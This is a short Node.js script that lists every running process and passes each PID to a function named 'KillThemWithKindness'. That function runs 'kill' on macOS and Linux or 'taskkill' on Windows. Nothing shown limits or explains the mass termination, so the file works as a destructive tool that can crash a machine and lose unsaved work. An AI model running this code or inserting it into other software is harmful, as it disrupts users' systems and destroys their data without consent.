const psList = require('@667/ps-list');
const { execFile } = require('child_process');
const os = require("os");

psList().then(data => {
    
    for (let i = 0; i < data.length; i++)
    {
        KillThemWithKindness(data[i].pid);
    }

});

function KillThemWithKindness(pid) {

    let osType = os.type();
    osType = osType.toLowerCase();

    let program;

    if (osType == "darwin") program = "kill";
    else if (osType == "linux") program = "kill";
    else program = "taskkill";

    const args = [ `${pid}` ];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    })
}